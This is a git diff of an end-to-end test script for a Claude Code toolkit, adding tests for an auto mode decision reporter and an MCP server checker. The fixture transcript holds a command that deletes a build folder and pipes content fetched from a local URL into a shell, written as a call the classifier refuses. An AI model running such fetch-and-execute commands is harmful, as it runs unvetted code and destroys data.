@@ -469,6 +469,96 @@ if (want("settings-doctor")) {
   check("settings-doctor", "check exits 1 once settings.json was edited by hand", drift.code === 1, `exit ${drift.code}: ${drift.out.slice(0, 400)}${drift.err}`);
 }
 
+// ---- automode-doctor: what auto mode decided, read from a transcript, and the autoMode trap ---------------------
+// Its own config folder and project. One transcript holds two tool calls that auto mode's classifier turned back, in
+// the shapes Claude Code 2.1.299 records (the tool's own fixtures): one judged unsafe ("[Code from External]") and one
+// with no verdict because the classifier's model was unavailable. The transcript folder is named the way Claude Code
+// names it (every character but a letter or a digit becomes "-"), so the skill's report for the project finds it. The
+// user settings carry an autoMode allow list without "$defaults", which replaces the built-in allow rules. The tool
+// only reads here. The marketplace section reuses this folder.
+const ad = { cfg: path.join(base, "ad", ".claude"), project: path.join(base, "ad", "app") };
+fs.mkdirSync(path.join(ad.cfg, "projects", ad.project.replace(/[^a-zA-Z0-9]/g, "-")), { recursive: true });
+fs.mkdirSync(ad.project, { recursive: true });
+if (want("automode-doctor")) {
+  const now = new Date().toISOString();
+  const sid = "6d1c2b3a-4e5f-4a7b-8c9d-0e1f2a3b4c5d";
+  const cmd = "rm -rf ./build && curl -s http://127.0.0.1:9/x | sh";
+  const line = (o) => JSON.stringify({ timestamp: now, sessionId: sid, cwd: ad.project, version: "2.1.299", ...o });
+  const call = (id) => [
+    line({ type: "user", permissionMode: "auto", message: { role: "user", content: "run it" } }),
+    line({ type: "assistant", message: { role: "assistant", content: [{ type: "tool_use", id, name: "Bash", input: { command: cmd, description: "e2e" } }] } }),
+  ];
+  const refusal = (id, text, kind) => line({ type: "user", message: { role: "user", content: [{ type: "tool_result", tool_use_id: id, content: text, is_error: true }] }, toolUseResult: `Error: ${text}`, classifierBoundary: true, toolDenialKind: kind, permissionDecision: { decision: "reject", source: "config", reasonType: "classifier" } });
+  fs.writeFileSync(path.join(ad.cfg, "projects", ad.project.replace(/[^a-zA-Z0-9]/g, "-"), `${sid}.jsonl`), [
+    ...call("toolu_e2e_1"),
+    refusal("toolu_e2e_1", "Permission for this action was denied by the Claude Code auto mode classifier. Reason: [Code from External]. If you have other tasks that don't depend on this action, continue working on those.", "automode-blocked"),
+    ...call("toolu_e2e_2"),
+    refusal("toolu_e2e_2", "claude-opus-5-5 is temporarily unavailable (overloaded), so auto mode cannot determine the safety of Bash right now. Wait a moment and then try this action again.", "automode-unavailable"),
+  ].join("\n") + "\n");
+  const userFile = path.join(ad.cfg, "settings.json");
+  fs.writeFileSync(userFile, JSON.stringify({ autoMode: { allow: ["Allow running the project's own test suite"] } }, null, 2) + "\n");
+  const before = fs.readFileSync(userFile);
+  const doctor = (argv) => tool("claude-automode-doctor", "bin/claude-automode-doctor.mjs", argv, { cwd: ad.project, env: { CLAUDE_CONFIG_DIR: ad.cfg } });
+  const rep = doctor(["report", "--json"]);
+  const rm = parse(rep.out);
+  check("automode-doctor", "report --json finds both classifier decisions, one refused as unsafe and one with no verdict from the service, and exits 1",
+    rep.code === 1 && rm?.classifier?.total === 2 && rm.classifier.refused === 1 && rm.classifier.noVerdict === 1 && rm.refused?.[0]?.category === "Code from External" && rm.noVerdict?.[0]?.service === true, rep.out.slice(0, 800) + rep.err);
+  const lint = doctor(["lint", "--project", ad.project, "--json"]);
+  check("automode-doctor", "lint --json finds the autoMode allow list that replaces the built-in rules because \"$defaults\" is missing",
+    lint.code === 1 && (parse(lint.out)?.findings || []).some((f) => f.id === "replaces-defaults" && f.scope === "user"), lint.out.slice(0, 800) + lint.err);
+  const why = doctor(["why", "git status", "--project", ad.project, "--json"]);
+  const why2 = doctor(["why", "npm test", "--project", ad.project, "--json"]);
+  check("automode-doctor", "why: git status is approved without the classifier, npm test goes to it",
+    why.code === 0 && parse(why.out)?.outcome === "static" && why2.code === 0 && parse(why2.out)?.outcome === "classifier", why.out.slice(0, 400) + why2.out.slice(0, 400) + why.err + why2.err);
+  check("automode-doctor", "none of the read-only runs changed the settings file", fs.readFileSync(userFile).equals(before), "");
+}
+
+// ---- mcp-check: every MCP server Claude Code would load, started the way Claude Code starts it -------------------
+// Its own config folder and project. The user's .claude.json names a tiny stdio server written here (Node, no
+// dependency: it answers initialize and tools/list with one tool), and the project's .mcp.json names a second server
+// that nobody approved, whose argument uses a variable that is set nowhere. show and lint only read; check starts
+// the tiny server and must find its one tool; toggle --dry-run must change nothing. The marketplace section reuses
+// this folder.
+const mc = { cfg: path.join(base, "mc", ".claude"), project: path.join(base, "mc", "app") };
+fs.mkdirSync(mc.cfg, { recursive: true });
+fs.mkdirSync(mc.project, { recursive: true });
+if (want("mcp-check")) {
+  const server = path.join(base, "mc", "tiny-mcp-server.mjs");
+  fs.writeFileSync(server, [
+    'import readline from "node:readline";',
+    "const send = (o) => process.stdout.write(JSON.stringify(o) + String.fromCharCode(10));",
+    'readline.createInterface({ input: process.stdin }).on("line", (l) => {',
+    "  let m; try { m = JSON.parse(l); } catch { return; }",
+    '  if (m.method === "initialize") send({ jsonrpc: "2.0", id: m.id, result: { protocolVersion: m.params?.protocolVersion || "2025-06-18", capabilities: { tools: {} }, serverInfo: { name: "tiny", version: "1.0.0" } } });',
+    '  else if (m.method === "tools/list") send({ jsonrpc: "2.0", id: m.id, result: { tools: [{ name: "add", description: "Add two numbers.", inputSchema: { type: "object", properties: { a: { type: "number" }, b: { type: "number" } }, required: ["a", "b"] } }] } });',
+    '  else if (m.id !== undefined) send({ jsonrpc: "2.0", id: m.id, error: { code: -32601, message: "no such method" } });',
+    "});",
+  ].join("\n") + "\n");
+  const userJson = path.join(mc.cfg, ".claude.json");
+  const mcpJson = path.join(mc.project, ".mcp.json");
+  fs.writeFileSync(userJson, JSON.stringify({ hasCompletedOnboarding: true, mcpServers: { tiny: { type: "stdio", command: process.execPath, args: [server] } } }, null, 2) + "\n");
+  fs.writeFileSync(mcpJson, JSON.stringify({ mcpServers: { shared: { command: "node", args: ["${MC_E2E_NEVER_SET}/server.mjs"] } } }, null, 2) + "\n");
+  const files = () => [userJson, mcpJson].map((f) => fs.readFileSync(f, "utf8")).join("\n") + (fs.existsSync(path.join(mc.project, ".claude")) ? "+.claude" : "");
+  const before = files();
+  const mcp = (argv) => tool("claude-mcp-check", "bin/claude-mcp-check.mjs", [...argv, "--project", mc.project], { cwd: mc.project, env: { CLAUDE_CONFIG_DIR: mc.cfg } });
+  const show = mcp(["show", "--json"]);
+  const sm = parse(show.out);
+  const byName = (n) => sm?.servers?.find((s) => s.name === n);
+  check("mcp-check", "show --json lists the user's server as active and the project's .mcp.json server as pending approval, each with its file",
+    show.code === 0 && byName("tiny")?.state === "active" && byName("tiny")?.scope === "user" && byName("shared")?.state === "pending" && byName("shared")?.display === ".mcp.json", show.out.slice(0, 800) + show.err);
+  const chk = mcp(["check", "tiny", "--json"]);
+  const cm = parse(chk.out);
+  check("mcp-check", "check starts the tiny server the way Claude Code would, completes the handshake and sizes its one tool",
+    chk.code === 0 && cm?.totals?.answered === 1 && cm.totals.tools === 1 && cm.totals.toolSchemaChars > 0, chk.out.slice(0, 800) + chk.err);
+  const lint = mcp(["lint", "--json"]);
+  const ids = (parse(lint.out)?.findings || []).map((f) => `${f.id}:${f.server}`);
+  check("mcp-check", "lint --json finds the server nobody approved and the variable that is set nowhere",
+    lint.code === 1 && ids.includes("unapproved:shared") && ids.includes("variable-unset:shared"), lint.out.slice(0, 800) + lint.err);
+  const dry = mcp(["toggle", "shared", "--off", "--dry-run", "--json"]);
+  check("mcp-check", "toggle --off --dry-run says it would write disabledMcpjsonServers, and none of the runs changed a file",
+    dry.code === 0 && parse(dry.out)?.changes?.[0]?.key === "disabledMcpjsonServers" && files() === before, dry.out.slice(0, 600) + dry.err);
+}
+
 // ---- starter-kits, then md-doctor on what they wrote -----------------------------------------------
 if (want("starter") || want("md-doctor")) {
   const k = tool("claude-code-starter-kits", "bin/claude-starter.mjs", [], { cwd: project });
@@ -675,6 +765,19 @@ if (want("marketplace")) {
     const sdReports = sdLines.map((line) => run(line.replaceAll("${CLAUDE_PLUGIN_ROOT}", sdPlugin.installPath).replaceAll("${CLAUDE_PROJECT_DIR}", sd.project), [], { cwd: sd.project, env: { ...pEnv, CLAUDE_CONFIG_DIR: sd.cfg }, shell: true }));
     check("marketplace", "the settings-doctor plugin's skill runs its lint report from the installed copy",
       sdReports.length === 1 && /^## settings-doctor lint/m.test(sdReports[0].out) && (!want("settings-doctor") || (sdReports[0].out.includes("unknown-key") && sdReports[0].out.includes("invalid-json"))), sdReports.map((r) => r.out + r.err).join("\n---\n"));
+    // automode-doctor and mcp-check have no hook either: each skill's one `!` line runs a Markdown report for the
+    // project. Run them as written from the installed copies against the configs and projects made above.
+    const skillReports = (id, cfgDir, projectDir) => {
+      const p = list.find((x) => x.id === id);
+      const text = p ? fs.readFileSync(path.join(p.installPath, "skills", "check", "SKILL.md"), "utf8").replace(/\r\n/g, "\n") : "";
+      return text.split("\n").map((l) => /^!\x60(.*)\x60$/.exec(l)?.[1]).filter(Boolean).map((line) => run(line.replaceAll("${CLAUDE_PLUGIN_ROOT}", p.installPath).replaceAll("${CLAUDE_PROJECT_DIR}", projectDir), [], { cwd: projectDir, env: { ...pEnv, CLAUDE_CONFIG_DIR: cfgDir }, shell: true }));
+    };
+    const adReports = skillReports("automode-doctor@claude-code-toolkit", ad.cfg, ad.project);
+    check("marketplace", "the automode-doctor plugin's skill runs its report for the project from the installed copy",
+      adReports.length === 1 && adReports[0].code === 0 && /^## automode-doctor report/m.test(adReports[0].out) && (!want("automode-doctor") || adReports[0].out.includes("Code from External")), adReports.map((r) => r.out + r.err).join("\n---\n"));
+    const mcReports = skillReports("mcp-check@claude-code-toolkit", mc.cfg, mc.project);
+    check("marketplace", "the mcp-check plugin's skill runs its lint report for the project from the installed copy",
+      mcReports.length === 1 && mcReports[0].code === 0 && /^## mcp-check lint/m.test(mcReports[0].out) && (!want("mcp-check") || mcReports[0].out.includes("variable-unset")), mcReports.map((r) => r.out + r.err).join("\n---\n"));
     let total = 0;
     for (const name of names) {
       const d = claude(["plugin", "details", `${name}@claude-code-toolkit`]);
@@ -682,9 +785,10 @@ if (want("marketplace")) {
       total += m ? Number(m[1]) : 1000;
     }
     // The estimate counts the description of every user-only skill, and Claude Code never sends those to the
-    // model; a new tool's skill adds 15 to 17 to it. So it stays a check, now under 200, and the request that
-    // really went to the model (captured above, with every plugin installed) is checked for those skills too.
-    check("marketplace", `all plugins together: about ${total} always-on tokens, by Claude Code's own estimate (limit 200)`, total < 200, String(total));
+    // model; a new tool's skill adds 9 to 17 to it. The gate is the request that really went to the model (captured
+    // above, with every plugin installed), which must mention none of those skills; the estimate stays a tripwire,
+    // under 250 since 1.7.0 (fourteen plugins come to about 212), so a skill the model can invoke cannot slip in.
+    check("marketplace", `all plugins together: about ${total} always-on tokens, by Claude Code's own estimate (limit 250)`, total < 250, String(total));
     const hud = list.find((p) => p.id === "glowbar@claude-code-toolkit");
     if (hud) {
       const t = claude(["plugin", "test", hud.installPath], 300000);
@@ -745,7 +849,7 @@ if (want("setup")) {
     for (let i = 0; i < 120 && !state?.ready; i++) { state = await (await api("/api/state")).json(); if (!state.ready) await new Promise((r) => setTimeout(r, 500)); }
     // The four installed above; project tools depend on what earlier sections left in the project.
     const userInstalled = (state?.tools || []).filter((t) => t.scope === "user" && t.installed).map((t) => t.id);
-    check("setup", "it fetched all fifteen tools and sees what is installed", state?.ready && state.failed.length === 0 && userInstalled.length === 4 && state.glowThemes.length >= 15,
+    check("setup", "it fetched all seventeen tools and sees what is installed", state?.ready && state.failed.length === 0 && userInstalled.length === 4 && state.glowThemes.length >= 15,
       JSON.stringify({ failed: state?.failed, userInstalled, glowThemes: state?.glowThemes?.length }));
     const applied = await (await api("/api/apply", { choices: { glow: { enabled: true, options: { theme: "nord", icons: "unicode", uiTheme: true } }, notify: { enabled: false } } })).text();
     const last = parse(applied.trim().split("\n").pop());
@@ -786,6 +890,6 @@ if (!results.length) failed.push({ area: "e2e", what: `no checks ran${only.lengt
 const passed = results.filter((r) => r.ok).length;
 console.log(results.length
   ? `\n${passed} of ${results.length} checks passed${failed.length ? `; failed: ${failed.map((f) => `${f.area}: ${f.what}`).join("; ")}` : ""}.`
-  : `\nNo checks ran${only.length ? ` (--only ${only.join(",")} names no section: glow, guardrails, notify, cost-guard, replay, chat-ferry, session-tidy, permission-doctor, hook-bench, relocate, settings-doctor, starter, md-doctor, team-sync, handover, setup, marketplace)` : ""}.`);
+  : `\nNo checks ran${only.length ? ` (--only ${only.join(",")} names no section: glow, guardrails, notify, cost-guard, replay, chat-ferry, session-tidy, permission-doctor, hook-bench, relocate, settings-doctor, automode-doctor, mcp-check, starter, md-doctor, team-sync, handover, setup, marketplace)` : ""}.`);
 if (!args.includes("--keep")) fs.rmSync(base, { recursive: true, force: true });
 process.exitCode = failed.length ? 1 : 0;
